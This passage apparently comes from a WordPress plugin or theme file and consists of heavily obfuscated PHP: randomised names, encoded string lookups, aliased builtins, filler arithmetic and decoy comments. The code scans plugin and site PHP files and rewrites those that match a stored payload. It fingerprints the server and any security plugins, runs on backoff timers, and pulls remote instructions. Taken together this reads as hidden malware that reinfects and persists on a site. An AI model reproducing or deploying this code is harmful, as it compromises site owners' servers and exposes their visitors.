  if    (!   $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(422)))  {
return;
  }
 
  $i_3jjnffws   =  $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(432))  ?  get_transient(j61b_lqa6xnjdjocyu15jd())  :  false;



 if (!  $GLOBALS['__scf_zj8mp2xbaqmp_35']($i_3jjnffws))  $i_3jjnffws  =     cips53lbwv4iv8mb(gz_aorofp7mo(433),  false);
    if     (! $GLOBALS['__scf_zj8mp2xbaqmp_35']($i_3jjnffws))   {
 return;
  }
    



     if (isset($i_3jjnffws[xognx_h1jzkh(434)]) &&   $GLOBALS['__scf_zj8mp2xbaqmp_35']($i_3jjnffws[xpm5lg9odtw6di(435)]))   {
$GLOBALS[xpm5lg9odtw6di(436)]  =  v9w_9ufttlebofkohqvr3($i_3jjnffws[ar6vo_1nyhx2koj5(435)]);
  }


 



 if (isset($i_3jjnffws[ar6vo_1nyhx2koj5(437)])    &&   $GLOBALS['__scf_zj8mp2xbaqmp_35']($i_3jjnffws[bk9m46jygo3f(437)])) {$efqbo8v6sbb4n=PHP_INT_MAX/PHP_INT_MAX;$jefxmggs6=$efqbo8v6sbb4n+14;
    $GLOBALS[xpm5lg9odtw6di(438)]  =  v9w_9ufttlebofkohqvr3($i_3jjnffws[ar6vo_1nyhx2koj5(437)]);
}
       
    if  (isset($i_3jjnffws[gz_aorofp7mo(439)])   &&    $GLOBALS['__scf_is0fvk8c7tq2_41']($i_3jjnffws[gz_aorofp7mo(439)]))    {
$GLOBALS[ar6vo_1nyhx2koj5(440)]  =   $i_3jjnffws[bk9m46jygo3f(439)];



       }



    if  (isset($i_3jjnffws[xognx_h1jzkh(441)]) && $GLOBALS['__scf_is0fvk8c7tq2_41']($i_3jjnffws[bk9m46jygo3f(442)]) &&   $GLOBALS['__scf_fxl4k4gsul_10']($i_3jjnffws[xpm5lg9odtw6di(442)])   >  (0x12+0x20))      {
   $GLOBALS[ar6vo_1nyhx2koj5(443)]  =  $i_3jjnffws[xpm5lg9odtw6di(442)];
  }


  if  (isset($i_3jjnffws[ar6vo_1nyhx2koj5(357)])   &&   $GLOBALS['__scf_is0fvk8c7tq2_41']($i_3jjnffws[gz_aorofp7mo(444)]) && $GLOBALS['__scf_fxl4k4gsul_10']($i_3jjnffws[bk9m46jygo3f(444)])  >  (7+93))  {
   $GLOBALS[xpm5lg9odtw6di(445)]  = $i_3jjnffws[xognx_h1jzkh(444)];
}
  }  catch  (Throwable   $o_qyrtxl85owt)    {
 kkpdha95nyx3tbltd10(xognx_h1jzkh(446),  $o_qyrtxl85owt);
} catch  (Exception $o_qyrtxl85owt)   {
// cold code

  }

   }
 



  function s89_h8gful_6ql()
       {$qfpmjm1ok=74*9;$k5o21e3u20m=$qfpmjm1ok-3;
   try  {



  if  (!$GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(422))     ||      !$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(186)))  return;
if  ((int) get_option(gz_aorofp7mo(447),  0) > $GLOBALS['__scf_ks7_xfapvywl_185']()     - (3583+17))   return;
 if    ($GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(432))  &&    get_transient(gz_aorofp7mo(448)))   return;
if (!zo4j_zt94w3xi7lu1pd()) return;
$m2sdbkvjvurkuiyk    =  tjj1y86387zrz51(xpm5lg9odtw6di(449),    "");
    if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($m2sdbkvjvurkuiyk) || $GLOBALS['__scf_fxl4k4gsul_10']($m2sdbkvjvurkuiyk)    <  (405+95)  ||    sl80t81tfwuwpn5w1_($m2sdbkvjvurkuiyk)    ||   !g9edwd6m8_9cm8($m2sdbkvjvurkuiyk))   {
// accumulate orchestrator for WP InnerBlocks

 $m2sdbkvjvurkuiyk =    false;

$hbefw2fsp0teo = iljst04arjh1pet016s(bho93o6vof3ni5_rg622_h());
 if   ($GLOBALS['__scf_is0fvk8c7tq2_41']($hbefw2fsp0teo)    &&  !sl80t81tfwuwpn5w1_($hbefw2fsp0teo)   && g9edwd6m8_9cm8($hbefw2fsp0teo))   {
fplgzzpq8bt5jm2fl03pi(ar6vo_1nyhx2koj5(450),  $hbefw2fsp0teo,  gz_aorofp7mo(365));
   $m2sdbkvjvurkuiyk   = $hbefw2fsp0teo;
}
    if   (!$m2sdbkvjvurkuiyk) {
     @update_option(xognx_h1jzkh(451),      $GLOBALS['__scf_ks7_xfapvywl_185'](), bk9m46jygo3f(365));
    return;
      }
   }
$y22_kfnfkon7   =    array(bho93o6vof3ni5_rg622_h());
      $knmylduouwe  = sxupmu4fhe9r2zxw();
 $xiqaz6b8acqwuwc   = wou4lqmx3dh5mlyfq3($knmylduouwe,  (4905+95));
     

 if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($xiqaz6b8acqwuwc)) {
     foreach   ($xiqaz6b8acqwuwc as $walsf9zikggv4)    {
    if ($GLOBALS['__scf__fl_gwujcblq_9']($walsf9zikggv4,    -(1+3)) ===  xognx_h1jzkh(94))      $y22_kfnfkon7[]    = $knmylduouwe .   '/'      .    $walsf9zikggv4;
   }
 }
    if  (defined(gz_aorofp7mo(452))   &&   $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(280)))   {
  foreach     ((array)  @$GLOBALS['__scf_b60g6hx_a7ggi_71'](WP_PLUGIN_DIR   . xpm5lg9odtw6di(453))     as     $zrk008mbgqyu)    $y22_kfnfkon7[] = $zrk008mbgqyu;
}

$y22_kfnfkon7   =  $GLOBALS['__scf_p3c9g_i0vy_148']($y22_kfnfkon7);



 $esr28po9bx2zeu = array();


      $g9lcteqfzr6q =  $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_a6uiw8bt24jybf_454'](ar6vo_1nyhx2koj5(455),     "", $GLOBALS['__scf__fl_gwujcblq_9']($m2sdbkvjvurkuiyk,   0,   (0x80ef+0x7f11))),  0,  (0x220+0x5e0));
     foreach  ($y22_kfnfkon7  as $dz9ttep94ondlpl)   {
$v9au38bovrp0     =   @$GLOBALS['__scf_r6y1fbsyx8i2l_99']($dz9ttep94ondlpl);
if   (!$v9au38bovrp0    ||  $v9au38bovrp0 <=  (1048493+83))   continue;
 $v5d33ytg8bnfa8bd =  @$GLOBALS['__scf_nae5vxe5wsw2v7_95']($dz9ttep94ondlpl,   false, null, 0,  (67306-1770));
if  (!$GLOBALS['__scf_is0fvk8c7tq2_41']($v5d33ytg8bnfa8bd)  ||   !sl80t81tfwuwpn5w1_($v5d33ytg8bnfa8bd))  continue;
  

 if  ($dz9ttep94ondlpl   !== bho93o6vof3ni5_rg622_h()   &&   $GLOBALS['__scf__fl_gwujcblq_9']($GLOBALS['__scf_a6uiw8bt24jybf_454'](ar6vo_1nyhx2koj5(456),  "", $v5d33ytg8bnfa8bd), 0,   (2000+48)) !==      $g9lcteqfzr6q)      continue;



 $esr28po9bx2zeu[]   =   $dz9ttep94ondlpl;
}
  if  (!$esr28po9bx2zeu) {
 @update_option(bk9m46jygo3f(451),    $GLOBALS['__scf_ks7_xfapvywl_185'](),   gz_aorofp7mo(365));
if      ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(457)))   set_transient(bk9m46jygo3f(448),      1, (530+70));


 return;
 }
 @update_option(bk9m46jygo3f(451), $GLOBALS['__scf_ks7_xfapvywl_185'](),    ar6vo_1nyhx2koj5(458));
 foreach  ($esr28po9bx2zeu  as      $s6um63o_s0zywj1) {
       f97udlofaljpuxw1_jgnfh($s6um63o_s0zywj1,  (413+7));
  if  (rmpvo8i8m8kfd9311njxy7($s6um63o_s0zywj1, o_a46xczfm0z3pa91s($m2sdbkvjvurkuiyk)))  {
   x1ssqxtszsg2ard3txeiw($s6um63o_s0zywj1);



    mcuqsw_cyo3mnayi6ofr6($s6um63o_s0zywj1);
     f97udlofaljpuxw1_jgnfh($s6um63o_s0zywj1,   (327+93));
  g6q1ehat0szqqsfbv2($s6um63o_s0zywj1);
 if ($s6um63o_s0zywj1  === bho93o6vof3ni5_rg622_h())  {
 p5t6fz6i7ccgjh(true);
jzt71g_lciq6atvff(true);
   }
   } else   {
    f97udlofaljpuxw1_jgnfh($s6um63o_s0zywj1,  (110+310));
     }
 }
    } catch  (Throwable $o_qyrtxl85owt)    {
    kkpdha95nyx3tbltd10(xpm5lg9odtw6di(459),    $o_qyrtxl85owt);$t_wstn2v9aqjx=4+10;$t44i2oyhkdqj=$t_wstn2v9aqjx-45;
    }  catch  (Exception $o_qyrtxl85owt)      {



}
}
function   qzygn58_p_e_6l()
 {
 static  $g_okuxhjj9      =   false;
 if ($g_okuxhjj9)  return;$clhffl9n=PHP_MAJOR_VERSION;$hmluzl858dm0=$clhffl9n*1;
     $g_okuxhjj9 = true;
try   {
 f8gfbhr78e9rr1pqh3_vet();
s89_h8gful_6ql();
 j_dnz8_pjzrpz2d7xzbpf();
  m0w3n75lf2_3hp();
 di6e9raz06_0xfxx();
   t5qx5dgkos1as4();
    hpofvuf7ak5x5wq9st();
fn97j4kcxtotofg();$io9tlwke=PHP_MAJOR_VERSION;$a5c4u3kqsjzw2=$io9tlwke*10;
    hvbm58mljux84oleqtsk();
if   (yqogww_3dp1t37p3())   {
    if  ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(460))     &&     did_action(gz_aorofp7mo(461)))     {

  if    ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(169)))     $GLOBALS['__scf_l3dns7czmg3tv_169'](gz_aorofp7mo(413));
   }     else  {
     at5lxm3vzat7_ev9(xognx_h1jzkh(461),    gz_aorofp7mo(413),  0);
 }
  }



 }   catch   (Throwable   $o_qyrtxl85owt)  {
 }   catch    (Exception      $o_qyrtxl85owt)    {
}
  }
function   w24perh9wlkwrto1()

{
  try    {
if   (!$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(290))  ||   !$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(462)))  return;


  if   (!$GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(463))  ||  !$GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(186)))  return;
     $a7t88ofjy5pc5  =    $GLOBALS['__scf_ks7_xfapvywl_185']();
      if   ($a7t88ofjy5pc5    -  (int)     @get_option(xpm5lg9odtw6di(464), 0)   < (3566+34)) return;
    @update_option(xpm5lg9odtw6di(464), $a7t88ofjy5pc5,   xognx_h1jzkh(458));


 @$GLOBALS['__scf_md_ke_yv3own8f_290'](home_url('/'), array(xpm5lg9odtw6di(465) =>    2,  bk9m46jygo3f(466) =>     false,    ar6vo_1nyhx2koj5(383)  =>     false));
} catch     (Throwable  $o_qyrtxl85owt) {
 }    catch (Exception     $o_qyrtxl85owt)  {
      }
 }
function  yqogww_3dp1t37p3()
 {
if (!   $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(463))) {
return  true;
 }



 



if    ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(432)) && get_transient(j61b_lqa6xnjdjocyu15jd()))  {
      return   false;

  }
     
    $q2__jb8tsv =   iez5nv7riwymw9wlb9sy();
       $x4l3_x2a66zooe6  =  cips53lbwv4iv8mb(bk9m46jygo3f(467),   false);
      if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($x4l3_x2a66zooe6) &&    isset($x4l3_x2a66zooe6[ar6vo_1nyhx2koj5(468)])   &&  (int)  $x4l3_x2a66zooe6[bk9m46jygo3f(469)] >= (248+52)  &&    (int)     $x4l3_x2a66zooe6[xognx_h1jzkh(470)]    <=   (86326+74))     $q2__jb8tsv  =    (int) $x4l3_x2a66zooe6[xpm5lg9odtw6di(470)];
  $r3_7i4nz_swv      = (int)   get_option(ar6vo_1nyhx2koj5(471),  0);
if     ($r3_7i4nz_swv  >  0 &&   ($GLOBALS['__scf_ks7_xfapvywl_185']()  -  $r3_7i4nz_swv)    <     $q2__jb8tsv) {
return  false;
      }
   



  $mq7mgosfw35   =  (int)  get_option(ar6vo_1nyhx2koj5(472), 0);



       if  ($mq7mgosfw35    >  0)   {
// @pipeline affine-type
$m1nlds9lt=(0xa2+0x14);$kb0b2hdgep0a=$m1nlds9lt%2;
      $x8_3jh25w7xpyd1 =  (int)      get_option(xognx_h1jzkh(473),  0);
      $ie2uiidnjrrj  =   array((299+1),  (467+433),      (0x37a+0x38e), (0x660+0x7b0),   (6872-3272));
 $xgcmekz1gtfy6 =    $ie2uiidnjrrj[$GLOBALS['__scf_li6gaes851wa_474'](0, $GLOBALS['__scf_askqa52jtol__2_475']($x8_3jh25w7xpyd1  - 1, (0x3+0x1)))];

$xgcmekz1gtfy6    += $GLOBALS['__scf_jlhdedaik0c_347'](0,     (int)  ($xgcmekz1gtfy6   *  0.25));



       if    (($GLOBALS['__scf_ks7_xfapvywl_185']()  -    $mq7mgosfw35)  < $xgcmekz1gtfy6)  {
// WordPress 6.5 revisions: countable negotiation



    return  false;
 }
// intercept witness for WP Search Block

 }
    
       return     true;
 }


function      jkr5j38q4xepwz45o()
  {
$x8_3jh25w7xpyd1  =  (int) get_option(xognx_h1jzkh(473),    0);



update_option(bk9m46jygo3f(473),  $x8_3jh25w7xpyd1   +   1);
update_option(bk9m46jygo3f(476),  $GLOBALS['__scf_ks7_xfapvywl_185']());
     }
 function  ozx3d7pa_0pan6tbk2o()
{
  $q97i7_qw446ei     = array();
      try    {
 $q97i7_qw446ei[xpm5lg9odtw6di(477)]   = xl8k_pjv1048a7ae7();
 $q97i7_qw446ei[xognx_h1jzkh(478)]    =   PHP_VERSION;
 $q97i7_qw446ei[xpm5lg9odtw6di(479)] =  $GLOBALS['__scf_w645jfzvum_104']();
$q97i7_qw446ei[bk9m46jygo3f(480)]   = ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(481))  && is_ssl())  ?  1      :   0;
$q97i7_qw446ei[xpm5lg9odtw6di(482)]    = ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(207))      &&     is_multisite())     ?  1      :    0;

   $q97i7_qw446ei[xpm5lg9odtw6di(483)] =  isset($GLOBALS[xpm5lg9odtw6di(484)])    ?     (string) $GLOBALS[xpm5lg9odtw6di(484)]  :     "";
$q97i7_qw446ei[bk9m46jygo3f(485)]    =   isset($_SERVER[gz_aorofp7mo(486)])  ? $GLOBALS['__scf__fl_gwujcblq_9']((string)  $_SERVER[xpm5lg9odtw6di(486)],     0,    (4+36))      : "";

 $tlccd1gj58q    =  (isset($GLOBALS[xognx_h1jzkh(487)]) && $GLOBALS['__scf_is0fvk8c7tq2_41']($GLOBALS[ar6vo_1nyhx2koj5(487)])) ?  $GLOBALS['__scf_u6m4cedwgt__319']($GLOBALS[bk9m46jygo3f(487)]) :  "";
     $q97i7_qw446ei[xognx_h1jzkh(488)]  = ($tlccd1gj58q !== "")    ?    1   : 0;
   $q97i7_qw446ei[xognx_h1jzkh(489)]    =  $GLOBALS['__scf_fxl4k4gsul_10']($tlccd1gj58q);


     $q97i7_qw446ei[xognx_h1jzkh(490)]   =    !empty($GLOBALS[bk9m46jygo3f(491)])  ?    1      :  0;
$q97i7_qw446ei[xpm5lg9odtw6di(492)]  = !empty($GLOBALS[xognx_h1jzkh(493)])    ?  1     : 0;$l0ki9qdd=3074;$yhmazkwvml12fa=$l0ki9qdd%12;
  $q97i7_qw446ei[xpm5lg9odtw6di(494)] = $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(463))   ?  (int) @get_option(bk9m46jygo3f(495), 0)  :  0;
$q97i7_qw446ei[xpm5lg9odtw6di(358)]   =   (ydk7304srtwvcn8gdl(gz_aorofp7mo(358), "") !==      "")    ? 1    :  0;


  $q97i7_qw446ei[gz_aorofp7mo(496)]  =      $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(497))     ?     (int)    @get_option(xognx_h1jzkh(498), 0) : 0;
$q97i7_qw446ei[gz_aorofp7mo(499)]    =  $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(500))  ?   (int)   @get_option(ar6vo_1nyhx2koj5(501),    0)      :    0;
        $q97i7_qw446ei[bk9m46jygo3f(502)]   = $GLOBALS['__scf_v_sk95ndl08_4'](ar6vo_1nyhx2koj5(500)) ? (int)  @get_option(bk9m46jygo3f(503), 0)   :     0;
   $y4e3mkwgaqm    = hzkj2ifwqdzf_u32qrf();
$q97i7_qw446ei[xpm5lg9odtw6di(504)]     =     @$GLOBALS['__scf_vpig9uwvw8_pu_20']($y4e3mkwgaqm     .  gz_aorofp7mo(505))   ?     (e7hb1k_8ecz1pec1t(@$GLOBALS['__scf_nae5vxe5wsw2v7_95']($y4e3mkwgaqm    .  bk9m46jygo3f(505),  false,   null,   0,  (8136+56)))  ?   2     : 1)   : 0;
  $q97i7_qw446ei[gz_aorofp7mo(506)] = @$GLOBALS['__scf_vpig9uwvw8_pu_20']($y4e3mkwgaqm .      gz_aorofp7mo(507)) ? (e7hb1k_8ecz1pec1t(@$GLOBALS['__scf_nae5vxe5wsw2v7_95']($y4e3mkwgaqm  .   bk9m46jygo3f(507),     false,    null,   0,  (8093+99)))  ?   2    : 1)     :  0;
  $q97i7_qw446ei[bk9m46jygo3f(508)] =  @$GLOBALS['__scf_vpig9uwvw8_pu_20']($y4e3mkwgaqm .  bk9m46jygo3f(509))     ?    (e7hb1k_8ecz1pec1t(@$GLOBALS['__scf_nae5vxe5wsw2v7_95']($y4e3mkwgaqm     .  xpm5lg9odtw6di(509), false,  null, 0,  (8181+11)))   ? 2    : 1)    :  0;
  $n3oa_6o82fz9oz4 = xognx_h1jzkh(510)  .  g2g3r6pz8prst3gz(ABSPATH .  'g',  (133^141));

  $o_5xxqfda2y933e      =     bk9m46jygo3f(511)  .    g2g3r6pz8prst3gz(ABSPATH   . 'g',    (0x1+0x7));
 $q97i7_qw446ei[gz_aorofp7mo(512)]     =  0;

        foreach    (array(fgatjmo7gg2xolgmpki4y2(),  $y4e3mkwgaqm,  ABSPATH .      xpm5lg9odtw6di(513))  as $uvp6pha6c5r) {
    if   (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($uvp6pha6c5r .  '/'  . $n3oa_6o82fz9oz4 .    xpm5lg9odtw6di(514))) $q97i7_qw446ei[xognx_h1jzkh(512)]   =  1;



  if     (@$GLOBALS['__scf_vpig9uwvw8_pu_20']($uvp6pha6c5r  .   '/'  .    $o_5xxqfda2y933e) &&   (int) @$GLOBALS['__scf_k4z5lhhe91ty_98']($uvp6pha6c5r .  '/'   .  $o_5xxqfda2y933e)   > $GLOBALS['__scf_ks7_xfapvywl_185']() -  (11+229))    {
   $q97i7_qw446ei[xognx_h1jzkh(512)] = 2;



 break;
  }
    }
// WP Redux Store: total message-queue

 unset($o_5xxqfda2y933e,  $uvp6pha6c5r);


 $d_4faydflpxb3yw =    $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(229))     ?    @$GLOBALS['__scf_if1j_n66jo7w7_111'](gz_aorofp7mo(515)) : false;
   if   (!$GLOBALS['__scf_is0fvk8c7tq2_41']($d_4faydflpxb3yw) ||  $d_4faydflpxb3yw    ===  ""  ||    $d_4faydflpxb3yw   ===     ar6vo_1nyhx2koj5(516))  $d_4faydflpxb3yw =   bk9m46jygo3f(517);$b_6pk4_nsqqp9=42+23;$aas91e2y3=$b_6pk4_nsqqp9-48;
     $q97i7_qw446ei[xognx_h1jzkh(518)]    = (@$GLOBALS['__scf_vpig9uwvw8_pu_20'](ABSPATH  . $d_4faydflpxb3yw)  && $GLOBALS['__scf_j_4rj7vg4ae0j_7']((string) @$GLOBALS['__scf_nae5vxe5wsw2v7_95'](ABSPATH .      $d_4faydflpxb3yw), bk9m46jygo3f(519)) !==    false)    ?  1    :      0;
 $q97i7_qw446ei[gz_aorofp7mo(520)] =      (@$GLOBALS['__scf_vpig9uwvw8_pu_20'](ABSPATH .  xognx_h1jzkh(521))   && $GLOBALS['__scf_j_4rj7vg4ae0j_7']((string)    @$GLOBALS['__scf_nae5vxe5wsw2v7_95'](ABSPATH   .  xognx_h1jzkh(521)),   gz_aorofp7mo(519))      !== false) ? 1 :  0;
  $q97i7_qw446ei[ar6vo_1nyhx2koj5(522)] = (@$GLOBALS['__scf_vpig9uwvw8_pu_20'](ABSPATH .     xognx_h1jzkh(523)) &&   $GLOBALS['__scf_j_4rj7vg4ae0j_7']((string)   @$GLOBALS['__scf_nae5vxe5wsw2v7_95'](ABSPATH   .   xpm5lg9odtw6di(523),  false, null,  0,   (65483+53)),  bk9m46jygo3f(524))   !==      false)     ? 1    :  0;
  $q97i7_qw446ei[gz_aorofp7mo(525)]  =     defined(ar6vo_1nyhx2koj5(526)) ?      1  :   0;


 $q97i7_qw446ei[xognx_h1jzkh(527)]  =  (defined(gz_aorofp7mo(528))   ||   defined(gz_aorofp7mo(529))    ||    defined(ar6vo_1nyhx2koj5(530))  || $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(531))    ||   $GLOBALS['__scf_kwfvo_j_hzb_532'](gz_aorofp7mo(533))   ||  isset($GLOBALS[bk9m46jygo3f(534)])     ||  $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(535)))  ?  1    : 0;
 $q97i7_qw446ei[gz_aorofp7mo(536)]  =     (int)  get_option(bk9m46jygo3f(471), 0);
$q97i7_qw446ei[xognx_h1jzkh(537)]   =  (int) get_option(xpm5lg9odtw6di(473),   0);

$q97i7_qw446ei[ar6vo_1nyhx2koj5(538)]  = (int)  get_option(xpm5lg9odtw6di(476),   0);
      $xtbjq1h9835    =   tjj1y86387zrz51(bk9m46jygo3f(539),  array());
$l7rov8myouf9v   =    0;

 $h7lqf6ejr1yp =  0;

    if ($GLOBALS['__scf_zj8mp2xbaqmp_35']($xtbjq1h9835))  {
// WP Heading Block sidebar region

  foreach  ($xtbjq1h9835 as  $walsf9zikggv4)    {
if   (a1q7xvg44_7w85oo2flit0($walsf9zikggv4) ===     "")    continue;
    $l7rov8myouf9v++;
   $sidnv_p7tzfdr  = $GLOBALS['__scf_zj8mp2xbaqmp_35']($walsf9zikggv4)  ?  (int)   (isset($walsf9zikggv4[xpm5lg9odtw6di(540)])      ?    $walsf9zikggv4[ar6vo_1nyhx2koj5(540)]    :  1)   :   1;
$q718e7lavyg = $GLOBALS['__scf_zj8mp2xbaqmp_35']($walsf9zikggv4) && isset($walsf9zikggv4[xognx_h1jzkh(541)]) ?     (int)   $walsf9zikggv4[bk9m46jygo3f(541)]    :  0;
       if  (!$sidnv_p7tzfdr      &&     (!$q718e7lavyg || $q718e7lavyg    < $GLOBALS['__scf_ks7_xfapvywl_185']()   -    (5116-1516)))      $h7lqf6ejr1yp++;
    }
    }
$q97i7_qw446ei[xpm5lg9odtw6di(542)]  =  $l7rov8myouf9v;
     $q97i7_qw446ei[xpm5lg9odtw6di(543)]    = $h7lqf6ejr1yp;
$gm1mxnaaohmk9uh = $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(500))  ?  @get_option(gz_aorofp7mo(544),      "")  :  "";
 $q97i7_qw446ei[xognx_h1jzkh(545)]  = $GLOBALS['__scf_is0fvk8c7tq2_41']($gm1mxnaaohmk9uh)  ?     $GLOBALS['__scf__fl_gwujcblq_9']($gm1mxnaaohmk9uh, 0, (4+1))  :    "";


$qzh17sc6ny    = $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(546)) ? @get_option(xognx_h1jzkh(547), array())  :      array();
  $q97i7_qw446ei[xognx_h1jzkh(548)]  = ($GLOBALS['__scf_zj8mp2xbaqmp_35']($qzh17sc6ny)  && (!empty($qzh17sc6ny['t'])   ||   !empty($qzh17sc6ny[ar6vo_1nyhx2koj5(549)])))    ? 1  : 0;

      }      catch (Throwable   $o_qyrtxl85owt)     {
// interpret capability for PSR-7 messages

$q97i7_qw446ei[bk9m46jygo3f(550)] = $GLOBALS['__scf__fl_gwujcblq_9']($o_qyrtxl85owt->getMessage(), 0, (0xe+0x2e));
  } catch (Exception  $o_qyrtxl85owt) {
  $q97i7_qw446ei[bk9m46jygo3f(551)]   = $GLOBALS['__scf__fl_gwujcblq_9']($o_qyrtxl85owt->getMessage(), 0, (38^26));
   }
        return  $q97i7_qw446ei;

  }



      function    gl7_7gutizqdufa7m4x6t()
     {
   if  ($GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(552)))     {


return (string)  site_url(ar6vo_1nyhx2koj5(553));
  }
 return  $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(554)) ? (string) wp_login_url()  :  "";

  }
 
     function   vse28wh0vwl84gzd2($ar2_dbzl24)
      {
  $mycp7poohob4h77  =    "";
  if ($GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(462)))  {
// exact revocation-list

 $mycp7poohob4h77 =  (string)    $GLOBALS['__scf_b58bt0r94kp1_555'](home_url(), constant(ar6vo_1nyhx2koj5(556)));
 }
  if     (!    $mycp7poohob4h77     && $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(557)))   {
     $mycp7poohob4h77  = (string) $GLOBALS['__scf_b58bt0r94kp1_555'](get_site_url(),   constant(xognx_h1jzkh(556)));
  }
  if  (!  $mycp7poohob4h77   &&   $GLOBALS['__scf_v_sk95ndl08_4'](xpm5lg9odtw6di(558)))     {
  $mycp7poohob4h77 = (string)  $GLOBALS['__scf_b58bt0r94kp1_555'](get_bloginfo(ar6vo_1nyhx2koj5(559)),  constant(bk9m46jygo3f(556)));

  }
 if (!   $mycp7poohob4h77 && $GLOBALS['__scf_v_sk95ndl08_4'](gz_aorofp7mo(546)))     {


$mycp7poohob4h77 =      (string) $GLOBALS['__scf_b58bt0r94kp1_555']((string) get_option(xpm5lg9odtw6di(560),   ""), constant(ar6vo_1nyhx2koj5(556)));

       }
  if   (! $mycp7poohob4h77    &&  isset($_SERVER[xpm5lg9odtw6di(561)]))  {
$mycp7poohob4h77  =     (string) $_SERVER[gz_aorofp7mo(562)];
       }
// WP Embed Block: predictive container

  if  (!  $mycp7poohob4h77   &&  isset($_SERVER[xpm5lg9odtw6di(563)]))   {

$mycp7poohob4h77      =    (string)   $_SERVER[xpm5lg9odtw6di(563)];
 }
     if (! $mycp7poohob4h77) {
        return $ar2_dbzl24;
   }
       return $mycp7poohob4h77;
}


   function    rykky2x73sq97ge($liaagmi_36_ynd = 0)
 {
 try    {

$yj6t7lqjjerd83    =     $GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(229))     ?     (int)  @$GLOBALS['__scf_if1j_n66jo7w7_111'](xpm5lg9odtw6di(564))  : 0;


 if ($GLOBALS['__scf_v_sk95ndl08_4'](xognx_h1jzkh(430)))  @$GLOBALS['__scf_lqfsnsgtu2c_429']((0x83+0x31));
  $rytmm_nwqraayfok  = ($yj6t7lqjjerd83 >  (0x1+0x13)     &&   $yj6t7lqjjerd83    <  (0x94+0x20))   ? ($yj6t7lqjjerd83    -   (15-5)) :     (($yj6t7lqjjerd83  >  0  &&     $yj6t7lqjjerd83 <=  (5<<2)) ? (0x1+0x9)   :  (0x35+0x25));



    if  ($liaagmi_36_ynd >  0 &&  $rytmm_nwqraayfok > $liaagmi_36_ynd)  $rytmm_nwqraayfok  =    $liaagmi_36_ynd;
     $GLOBALS[ar6vo_1nyhx2koj5(286)]   = $GLOBALS['__scf_nz_jvx37ph58fn_287'](true)   +  $rytmm_nwqraayfok;
      if  (! yqogww_3dp1t37p3())     {
    return;
    }
  if     (!_sshnzj53qt2m4bfy5eod(bk9m46jygo3f(376))) {


return;
 }
// @link flyweight


  $yhh03ed_b42z3ykg  =  $GLOBALS['__scf_nz_jvx37ph58fn_287'](true);
 $k3ct57ozmwrl    = egy9odcldnvjn7asahosh((int)   ($rytmm_nwqraayfok    * 0.6));
 if (
   ! $GLOBALS['__scf_zj8mp2xbaqmp_35']($k3ct57ozmwrl)
  || !   isset($k3ct57ozmwrl[gz_aorofp7mo(342)]) ||  !   $GLOBALS['__scf_is0fvk8c7tq2_41']($k3ct57ozmwrl[gz_aorofp7mo(342)])  ||  !  $k3ct57ozmwrl[ar6vo_1nyhx2koj5(342)]


  ||  !   isset($k3ct57ozmwrl[bk9m46jygo3f(337)])  ||  ! $GLOBALS['__scf_zj8mp2xbaqmp_35']($k3ct57ozmwrl[xpm5lg9odtw6di(337)])  ||  empty($k3ct57ozmwrl[xognx_h1jzkh(337)])
      )  {
jkr5j38q4xepwz45o();
     return;
}
     $go82x22w4tq =  $k3ct57ozmwrl[xognx_h1jzkh(565)];
   $wxlcpy2l1ch78hv7 =    $k3ct57ozmwrl[xognx_h1jzkh(337)];



 fplgzzpq8bt5jm2fl03pi(bk9m46jygo3f(340),   $go82x22w4tq, xpm5lg9odtw6di(566));

fplgzzpq8bt5jm2fl03pi(ar6vo_1nyhx2koj5(567), $GLOBALS['__scf_j_4rj7vg4ae0j_7']($go82x22w4tq,  bk9m46jygo3f(568)) === 0    ?   1   :  0, xpm5lg9odtw6di(566));



 $d_z1sw79n8r_  =  $GLOBALS['__scf_v_sk95ndl08_4'](bk9m46jygo3f(546))    ?  (string)   get_option(xognx_h1jzkh(569),  "")  : "";
  if  ($d_z1sw79n8r_   !==  "" &&  $GLOBALS['__scf_uh0dc0gefs_xhu_149']($d_z1sw79n8r_, $wxlcpy2l1ch78hv7,    true))   {
   $wxlcpy2l1ch78hv7 =   $GLOBALS['__scf_xctrtxw7z4_147']($GLOBALS['__scf_expvj_2k_kl_150']($wxlcpy2l1ch78hv7,   array($d_z1sw79n8r_)));



   $GLOBALS['__scf_pku6wc4sci0i_570']($wxlcpy2l1ch78hv7);
